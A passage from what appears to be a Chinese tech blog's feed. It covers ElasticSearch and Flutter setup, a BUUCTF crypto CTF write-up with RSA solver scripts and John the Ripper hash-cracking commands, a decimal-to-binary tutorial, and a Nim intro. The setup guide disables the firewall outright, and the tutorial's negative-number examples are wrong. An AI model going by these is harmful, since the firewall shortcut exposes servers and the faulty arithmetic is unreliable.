-Sn65535</code></pre><p>发现两个返回都是<code>65535</code>，就证明修改生效了。</p><p>然后看下一个报错</p><pre class=" language-shell"><code class="language-shell">[2]: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]</code></pre><p>修改<code>/etc/sysctl.conf</code>， 添加</p><pre class=" language-yml"><code class="language-yml">vm.max_map_count=262144</code></pre><p>保存退出 并 执行</p><pre class=" language-shell"><code class="language-shell">[root@localhost bin]# sysctl -pvm.max_map_count = 262144</code></pre><p>再切换成<code>elasticuser</code>用户, 去运行<code>es</code>.<br><img src="/images/10/result.png" alt></p><p>可以看到运行成功了, 使用浏览器去访问<code>http://&lt;centos的IP地址&gt;:9200</code></p><p>emm 无法访问… </p><p>因为Centos默认开启了防火墙. 可以直接关闭防火墙 (启停服务需要root用户)</p><pre class=" language-shell"><code class="language-shell">[root@localhost bin]$ systemctl stop firewalld.service</code></pre><p>再重新运行<code>es</code>.</p><p><img src="/images/10/bowser.png" alt></p><p>ok, 安装完毕, 接下来就可以正常学习和使用<code>ElasticSearch</code>了。</p><blockquote><p>就这样！</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;ElasticSearch&lt;/strong&gt;是一个采用Java语言编写搜索服务器，提供了一个分布式多用户的全文搜索引擎，能够达到实时搜索，稳定，可靠，快速，安装使用方便。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://helianthus.top/categories/Linux/"/>
    
      <category term="ElasticSearch" scheme="https://helianthus.top/categories/Linux/ElasticSearch/"/>
    
    
      <category term="ES" scheme="https://helianthus.top/tags/ES/"/>
    
      <category term="ElasticSearch" scheme="https://helianthus.top/tags/ElasticSearch/"/>
    
      <category term="Centos" scheme="https://helianthus.top/tags/Centos/"/>
    
  </entry>
  
  <entry>
    <title>Windows下配置Flutter运行开发环境</title>
    <link href="https://helianthus.top/2019/12/19/9-Windows-Set-FlutterDev/"/>
    <id>https://helianthus.top/2019/12/19/9-Windows-Set-FlutterDev/</id>
    <published>2019-12-19T10:10:30.000Z</published>
    <updated>2020-05-27T06:39:15.862Z</updated>
    
    <content type="html"><![CDATA[<p>Windows下设置Flutter的运行开发环境. 说实话, 看到移动平台的开发就觉得很麻烦，还好这次Flutter没让我太过于失望。</p><a id="more"></a><h2 id="下载必要的软件"><a href="#下载必要的软件" class="headerlink" title="下载必要的软件"></a>下载必要的软件</h2><ul><li><a href="https://git-scm.com/download/win" target="_blank" rel="noopener">GIt For Windows</a> Git工具, 在windows下的客户端.</li><li><a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">Java</a> Java JDK8</li><li><a href="https://developer.android.com/studio" target="_blank" rel="noopener">Android Studio</a> 是为了安装SDK.</li><li><a href="https://flutter.dev/docs/development/tools/sdk/releases#windows" target="_blank" rel="noopener">Flutter</a>  肯定是下载最新版本啦.</li><li><a href="https://code.visualstudio.com/Download" target="_blank" rel="noopener">VS Code</a> 超级轻量的代码编辑器</li></ul><h2 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h2><h4 id="Java设置环境变量"><a href="#Java设置环境变量" class="headerlink" title="Java设置环境变量"></a>Java设置环境变量</h4><p>将JDK的安装目录放入环境变量 key: <code>JAVA_HOME</code> value: <code>D:\Software\Java\jdk1.8.0_231</code>  看个人情况.</p><h4 id="Flutter设置环境变量"><a href="#Flutter设置环境变量" class="headerlink" title="Flutter设置环境变量"></a>Flutter设置环境变量</h4><p>将下载的Flutter SDK解压, 放入<em>没有中文，没有空格</em>的目录下, 设置环境变量<br>将<code>Flutter</code>放入系统变量key: <code>FLUTTER_HOME</code> value: <code>D:\LearningMaterials\flutter</code><br>然后设置PATH: <code>%FLUTTER_HOME%\bin</code> 即可.</p><h4 id="VSCode安装插件"><a href="#VSCode安装插件" class="headerlink" title="VSCode安装插件"></a>VSCode安装插件</h4><ul><li>Dart</li><li>Flutter</li></ul><h2 id="检查运行环境"><a href="#检查运行环境" class="headerlink" title="检查运行环境"></a>检查运行环境</h2><h4 id="doctor"><a href="#doctor" class="headerlink" title="doctor"></a>doctor</h4><p><code>cmd</code>下运行<code>flutter doctor</code>会自动诊断当前的环境是否有异常</p><h4 id="emulators"><a href="#emulators" class="headerlink" title="emulators"></a>emulators</h4><p><code>cmd</code>下运行<code>flutter emulators</code>会列出当前可用的<code>Android</code>和<code>IOS</code>设备.<br>通过运行<code>flutter emulators --launch &lt;emulator id&gt;</code>指定列出的设备名, 即可打开设备.</p><h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p><code>cmd</code>在代码根目录运行<code>flutter run</code>即可在运行的设备中打开APP, 不过第一次可能会出现未<code>license</code>的错误, 可以运行<code>flutter doctor --android-licenses</code>, 根据提示全部按<code>y</code>, 结束后再次<code>flutter run</code>即可成功运行.</p><hr><p>学习…学习…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Windows下设置Flutter的运行开发环境. 说实话, 看到移动平台的开发就觉得很麻烦，还好这次Flutter没让我太过于失望。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Flutter" scheme="https://helianthus.top/categories/Flutter/"/>
    
    
      <category term="Android" scheme="https://helianthus.top/tags/Android/"/>
    
      <category term="Flutter" scheme="https://helianthus.top/tags/Flutter/"/>
    
      <category term="Windows" scheme="https://helianthus.top/tags/Windows/"/>
    
      <category term="IOS" scheme="https://helianthus.top/tags/IOS/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF 密码学思路WriteUP</title>
    <link href="https://helianthus.top/2019/12/03/8-BUUCTF-Crypto-WriteUP/"/>
    <id>https://helianthus.top/2019/12/03/8-BUUCTF-Crypto-WriteUP/</id>
    <published>2019-12-03T09:34:21.000Z</published>
    <updated>2020-05-27T23:31:22.287Z</updated>
    
    <content type="html"><![CDATA[<p>BUUCTF, 自己学习的过程中思路记录, 以及flag…  (目的是记录自己的思路和想法！！！)</p><p>题目地址: <a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">BUUCTF</a></p><a id="more"></a><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>直接拿去<a href="https://www.somd5.com/" target="_blank" rel="noopener">SOMD5</a>解密<br><code>flag{admin1}</code></p><h3 id="看我回旋踢"><a href="#看我回旋踢" class="headerlink" title="看我回旋踢"></a>看我回旋踢</h3><p>ROT13解密, 直接<a href="http://ctf.ssleye.com/rot13.html" target="_blank" rel="noopener">在线工具</a>.<br><code>flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1}</code></p><h3 id="Url编码"><a href="#Url编码" class="headerlink" title="Url编码"></a>Url编码</h3><p>用Hackbar之类的工具进行URL解码<br><code>flag{and 1=1}</code></p><h3 id="摩丝"><a href="#摩丝" class="headerlink" title="摩丝"></a>摩丝</h3><p>这可不是丝wa… 用工具直接解摩斯电码吧.<br>工具: <a href="http://ctf.ssleye.com/morse.html" target="_blank" rel="noopener">摩尔斯电码解密</a><br><code>flag{iloveyou}</code></p><h3 id="一眼就解密"><a href="#一眼就解密" class="headerlink" title="一眼就解密"></a>一眼就解密</h3><p>打开F12, 在Console中输入</p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">"ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30="</span><span class="token punctuation">)</span></code></pre><p><code>flag{THE_FLAG_OF_THIS_STRING}</code></p><h3 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h3><p>没思路先写脚本穷举, 发现从ascii+5开始依次出现flag关键字, 于是写脚本进行解密.</p><pre class=" language-python"><code class="language-python">cipher <span class="token operator">=</span> <span class="token string">"afZ_r9VYfScOeO_UL^RWUc"</span>index <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> num <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>        temp <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> num<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    index <span class="token operator">+=</span> <span class="token number">1</span></code></pre><p><code>flag{Caesar_variation}</code></p><h3 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h3><p>工具题，没意义，也没难度，知道有这种编码就会解.<br><a href="http://ctf.ssleye.com/quoted.html" target="_blank" rel="noopener">在线工具</a><br><code>flag{那你也很棒哦}</code></p><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>社工题目, 之前做过类似的, 知道规律就行, 没什么难度.  (别问为什么, 这就是CTF)<br><code>flag{zs19900315}</code></p><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h3><p>感觉不应该是密码学, 应该是Misc题目.<br>使用WinHex把压缩包打开, 将Hex的, <code>50 4B 03 04 14 00 09 00</code>改成<code>50 4B 03 04 14 00 00 00</code>, 保存再去解压, 就会发现可以正常解压了.<br><code>flag{Adm1N-B2G-kU-SZIP}</code></p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>稍微了解一下RSA加密算法就知道d怎么求了, 直接上py脚本.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> libnump <span class="token operator">=</span> <span class="token number">473398607161</span>q <span class="token operator">=</span> <span class="token number">4511491</span>e <span class="token operator">=</span> <span class="token number">17</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>flag{125631357777427553}</code></p><h3 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h3><p>看题目就知道是什么加密, 直接找<a href="http://tool.chinaz.com/Tools/TextEncrypt.aspx" target="_blank" rel="noopener">在线工具</a>.<br><code>flag{Cute_Rabbit}</code></p><h3 id="丢失的MD5"><a href="#丢失的MD5" class="headerlink" title="丢失的MD5"></a>丢失的MD5</h3><p>给了一个Python脚本, 脚本是Python2的, 直接运行得到Flag. (目的是了解MD5爆破)<br><code>flag{e9032994dabac08080091151380478a2}</code></p><h3 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h3><p>栅栏密码, 选择2栏, 进行<strong>加密</strong>操作, flag直接出.  (注意是加密, 不是解密)<br><code>flag{wethinkwehavetheflag}</code></p><h3 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h3><p>通过<a href="http://factordb.com/index.php?query=98554799767" target="_blank" rel="noopener">在线工具</a>进行质因数分解, 得到两个素数, 根据题目, 将小素数放在前面, 大素数放在后面, 拼接, 进行md5 32位的加密.<br><code>flag{d450209323a847c8d01c6be47c81811a}</code></p><h3 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h3><p>需要了解RSA的加密过程, 才会知道解密过程, 背脚本是没有意义的。<br>建议去看看RSA原理, 推荐几个我看过的教程.<br><a href="https://www.youtube.com/watch?v=TqX0AHHwRYQ" target="_blank" rel="noopener">RSA-1</a><br><a href="https://www.youtube.com/watch?v=AS0fYRnotEo" target="_blank" rel="noopener">RSA-2</a></p><p>看完上面两个绝对会RSA基础题目解密了.<br>上Python脚本!!</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> libnump <span class="token operator">=</span>  <span class="token number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>q <span class="token operator">=</span>  <span class="token number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>e <span class="token operator">=</span>  <span class="token number">65537</span>c <span class="token operator">=</span>  <span class="token number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span>d <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>result <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p><code>flag{5577446633554466577768879988}</code></p><h3 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h3><p>？这什么沙雕题目，如果看不懂<code>辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳</code>， <code>+甲子</code>就GG.<br>得出: <code>XZSDMFLZ</code><br>然后进行古典密码解密, 先<code>4栏栅栏</code>, 再<code>偏移21位凯撒</code>, 即可得出FLag<br><code>flag{SHUANGYU}</code></p><h3 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h3><p>说实话, 这个题目一开始我没怎么看明白, 后来找到规律就好办了.<br>先将<code>FRPHEVGL</code>进行ASCII爆破, 看题目说会出现有意义的单词, 就每次爆破的时候, ASCII大于<code>z</code>的时候， 将当前字母的ASCII码进行<code>-26</code>操作, 爆破发现<code>13</code>是有意义<code>SECURITY</code>的, 直接上脚本.</p><pre class=" language-python"><code class="language-python">cipher <span class="token operator">=</span> <span class="token string">"FRPHEVGL"</span>  <span class="token comment" spellcheck="true"># 已知的密文</span>result <span class="token operator">=</span> <span class="token string">"SECURITY"</span>  <span class="token comment" spellcheck="true"># 第一步找到的有意义单词</span>secert <span class="token operator">=</span> <span class="token number">13</span>          <span class="token comment" spellcheck="true"># 第二步找到的有意义偏移量</span>t <span class="token operator">=</span> <span class="token string">"ComeChina"</span>      <span class="token comment" spellcheck="true"># 需要解密的密文</span><span class="token comment" spellcheck="true"># 1. 爆破具体是位移多少位才是有意义的.</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>        temp <span class="token operator">=</span> ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> i        <span class="token keyword">if</span> temp <span class="token operator">></span> ord<span class="token punctuation">(</span><span class="token string">"Z"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp <span class="token operator">-=</span> <span class="token number">26</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2. 找规律, 发现都是根据13来的.</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> j <span class="token keyword">in</span> zip<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    j <span class="token operator">=</span> ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">></span> j<span class="token punctuation">:</span>        temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j <span class="token operator">-</span> i<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3. 根据题目规律爆破, 超过z就-26, 即可得到Flag</span><span class="token keyword">for</span> i <span class="token keyword">in</span> t<span class="token punctuation">:</span>    t <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> secert    <span class="token keyword">if</span> t <span class="token operator">></span> ord<span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">-=</span> <span class="token number">26</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre><p><code>flag{PbzrPuvan}</code></p><h3 id="Windows系统密码"><a href="#Windows系统密码" class="headerlink" title="Windows系统密码"></a>Windows系统密码</h3><p>下载下来附件拿去<code>Kali</code>使用<code>John</code>工具进行解密.</p><pre class=" language-shell"><code class="language-shell">john pass.hashjohn --show --format=LM pass.hash</code></pre><p>有点坑, 要小写.<br><code>flag{good-luck}</code></p><h3 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h3><p>已知dp,dq求解: 题目给了dp, dq, 需要去了解一下dp,dq是什么, 然后直接脚本做题.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> binascii<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    InvQ <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>q<span class="token punctuation">,</span>p<span class="token punctuation">)</span>    mp <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>dp<span class="token punctuation">,</span>p<span class="token punctuation">)</span>    mq <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>q<span class="token punctuation">)</span>    m<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mp<span class="token operator">-</span>mq<span class="token punctuation">)</span><span class="token operator">*</span>InvQ<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span>mq    <span class="token keyword">print</span> <span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>flag{W31c0m3_70_Ch1n470wn}</code></p><h3 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h3><p>题目给了两个<code>c</code>, 两个<code>e</code>, 一个<code>n</code>, 典型的<code>RSA共模攻击</code>, 直接一把梭.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> binascii<span class="token keyword">def</span> <span class="token function">RSACommonMode</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> a<span class="token punctuation">,</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            x<span class="token punctuation">,</span> y <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>            <span class="token keyword">return</span> y<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y    s <span class="token operator">=</span> egcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>    s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        s1 <span class="token operator">=</span> <span class="token operator">-</span> s1        c1 <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        s2 <span class="token operator">=</span> <span class="token operator">-</span> s2        c2 <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> pow<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n    <span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>flag{49d91077a1abcb14f1a9d546c80be9ef}</code></p><h3 id="凯撒？替换？呵呵"><a href="#凯撒？替换？呵呵" class="headerlink" title="凯撒？替换？呵呵!"></a>凯撒？替换？呵呵!</h3><p>一堆看不懂的乱码, 扔去<a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a>进行字符频率统计, 就可以得到flag了.</p><p>大坑, 空格要删除掉.<br><code>flag{substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake}</code></p><hr><p>先到这里吧.  以后慢慢补充.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BUUCTF, 自己学习的过程中思路记录, 以及flag…  (目的是记录自己的思路和想法！！！)&lt;/p&gt;
&lt;p&gt;题目地址: &lt;a href=&quot;https://buuoj.cn/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;BUUCTF&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://helianthus.top/tags/CTF/"/>
    
      <category term="BUUCTF" scheme="https://helianthus.top/tags/BUUCTF/"/>
    
      <category term="Crypto" scheme="https://helianthus.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>手算正反十进制转换二进制过程</title>
    <link href="https://helianthus.top/2019/10/28/7-Dec-to-Bin-Calc/"/>
    <id>https://helianthus.top/2019/10/28/7-Dec-to-Bin-Calc/</id>
    <published>2019-10-27T19:57:06.000Z</published>
    <updated>2020-05-27T23:38:03.514Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下手算十进制到二进制, 包括正数和负数转换二进制.</p><a id="more"></a><h2 id="十进制正数-转换-二进制"><a href="#十进制正数-转换-二进制" class="headerlink" title="十进制正数 转换 二进制"></a>十进制正数 转换 二进制</h2><ol><li>除以2的整数结果除以2到0为止.</li><li>结果从下往上看.</li></ol><ul><li><p>Example: 把9计算成2进制.</p><pre><code>99/2  = 4 -&gt; 1  ; 9/2=4.5 把小数点忽略, 就是4, 因为有小数点, 所以这个位置就是1.4/2  = 2 -&gt; 0  ; 4/2=2 没有小数点, 这个位置就是0.2/2  = 1 -&gt; 0  ; 结果等于1的时候还要进行除.1/2  = 0 -&gt; 1  ; 结果为0的时候才能结束, 1/2=0.5, 有余数, 所以为1.从下向上看, 排序1001, 这个计算的结果从上到下和从下到上都一样...</code></pre></li><li><p>Example: 把27计算2进制.</p><pre><code>2727/2 = 13 -&gt; 113/2 = 6  -&gt; 16/2  = 3  -&gt; 03/2  = 1  -&gt; 11/2  = 0  -&gt; 1结果是: 0001 1011</code></pre></li></ul><h2 id="十进制负数-转换-二进制"><a href="#十进制负数-转换-二进制" class="headerlink" title="十进制负数 转换 二进制"></a>十进制负数 转换 二进制</h2><ol><li>计算负数<code>绝对值</code>的二进制结果.</li><li>将第一步计算的结果进行取反.</li><li>取反后+1, 就是最终结果</li><li>64位的, 计算的内容前面填充1.</li></ol><ul><li>Example: 把-9转换二进制<pre><code>99/2 4 14/2 2 02/2 1 01/2 0 1</code></pre></li></ul><p>源码: 1001<br>反码: 0110<br>补码: 反码 + 1 : 0111</p><p>结果: 0111</p><pre><code>- Example: 把-15转换二进制</code></pre><p>15<br>15/2 7 1<br>7/2  3 1<br>3/2  1 1<br>1/2  0 1</p><p>源码: 1111<br>反码: 0000<br>补码: 0001</p><p>结果: 0001<br>```</p><hr><p>其他数计算都是这个步骤, 去尝试一下吧~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习一下手算十进制到二进制, 包括正数和负数转换二进制.&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="https://helianthus.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="进制转换" scheme="https://helianthus.top/tags/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/"/>
    
      <category term="二进制" scheme="https://helianthus.top/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>Nim编程语言快速入门 (附代码例子)</title>
    <link href="https://helianthus.top/2019/10/03/6-Nim-Programming-Language/"/>
    <id>https://helianthus.top/2019/10/03/6-Nim-Programming-Language/</id>
    <published>2019-10-03T13:12:29.000Z</published>
    <updated>2020-05-27T23:38:40.330Z</updated>
    
    <content type="html"><![CDATA[<p>Nim是一种静态类型编译的系统编程语言, 它结合了其他成熟语言的成功概念, 这次就带你5分钟学会Nim的编写, 来跟我一起尝试一下吧.</p><a id="more"></a><p>Nim官网: <a href="https://Nim-lang.org/" target="_blank" rel="noopener">https://Nim-lang.org/</a><br>Nim中文社区: <a href="https://Nim-lang-cn.org/" target="_blank" rel="noopener">https://Nim-lang-cn.org/</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>花了半小时的时间去试了试这门语言, 可以通过Nim生成js或者c的代码以及可执行文件, 感觉蛮酷的, 做个分享.</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>Nim编译出一个exe文件是这么做的:</p><pre class=" language-shell"><code class="language-shell">Nim c main.Nim</code></pre><p>Nim 编译出一个js文件是这么做的:</p><pre class=" language-shell"><code class="language-shell">Nim js main.Nim</code></pre><p>发没发现? 只需要更改Nim <type> 中的内容就可以了.</type></p><p>不过, 你无法编译成”世界上最好的语言”, 比如<code>Nim php main.Nim</code>, 会报错的！！</p><h2 id="超级详细带代码体验"><a href="#超级详细带代码体验" class="headerlink" title="超级详细带代码体验"></a>超级详细带代码体验</h2><h4 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h4><h5 id="基本变量类型"><a href="#基本变量类型" class="headerlink" title="基本变量类型"></a>基本变量类型</h5><pre class=" language-Nim"><code class="language-Nim"># 指定类型var name: string = "HelloWorld"# 类型推断var i = 10</code></pre><h5 id="列表-数组"><a href="#列表-数组" class="headerlink" title="列表(数组)"></a>列表(数组)</h5><pre class=" language-Nim"><code class="language-Nim">var list = @[1,2,3,4,5]</code></pre><p>加上<code>@</code>符号表明是动态数组, 可以进行<code>Add</code>和<code>POP</code>操作.</p><h5 id="Table-在Py叫Dict-Go叫Map"><a href="#Table-在Py叫Dict-Go叫Map" class="headerlink" title="Table(在Py叫Dict, Go叫Map)"></a>Table(在Py叫Dict, Go叫Map)</h5><pre class=" language-Nim"><code class="language-Nim">import tablesvar dict = {"one": "HeliantHuS"}.toTable# 取值echo dict["one"]  # HeliantHuS</code></pre><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><pre class=" language-Nim"><code class="language-Nim"># 打印HelloWorldecho "HelloWorld"</code></pre><p>Nim中的注释和Python一样.</p><h4 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h4><h5 id="case-of"><a href="#case-of" class="headerlink" title="case-of"></a>case-of</h5><pre class=" language-Nim"><code class="language-Nim">var name: string = readLine(stdin)# case就等于其他语言的switch, 